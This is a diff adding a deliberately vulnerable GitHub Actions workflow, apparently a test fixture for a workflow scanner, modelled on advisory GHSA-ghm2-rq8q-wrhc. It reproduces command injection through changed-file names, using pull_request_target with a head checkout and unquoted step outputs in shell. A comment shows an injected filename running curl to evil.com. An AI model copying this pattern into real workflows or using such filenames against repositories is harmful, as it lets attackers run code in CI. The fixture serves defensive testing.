@@ -1,0 +1,41 @@
+# GHSA-ghm2-rq8q-wrhc: Command injection via malicious filenames in tj-actions/verify-changed-files
+# Advisory: https://github.com/advisories/GHSA-ghm2-rq8q-wrhc
+# Vulnerability Type: Command Injection (CWE-78)
+# Expected Rule: CodeInjectionCriticalRule, OutputClobberingCriticalRule
+# Severity: High
+
+name: Vulnerable - Command Injection via Malicious Filenames
+
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+jobs:
+  verify-changed-files-vulnerable:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      pull-requests: read
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Verify changed files (vulnerable pattern from tj-actions/verify-changed-files@v16)
+        id: verify-changed-files
+        run: |
+          # Simulate getting changed files (vulnerable to malicious filenames)
+          CHANGED_FILES="file1.txt file2.txt"
+          echo "changed_files=$CHANGED_FILES" >> "$GITHUB_OUTPUT"
+
+      - name: Process changed files (vulnerable)
+        run: |
+          # Vulnerable: Direct substitution of changed_files output
+          # An attacker can inject commands via filename like: file.txt$(curl http://evil.com)
+          echo "Changed files: ${{ steps.verify-changed-files.outputs.changed_files }}"
+
+          # This loop is vulnerable if filenames contain special characters
+          for file in ${{ steps.verify-changed-files.outputs.changed_files }}; do
+            echo "Processing: $file"
+          done
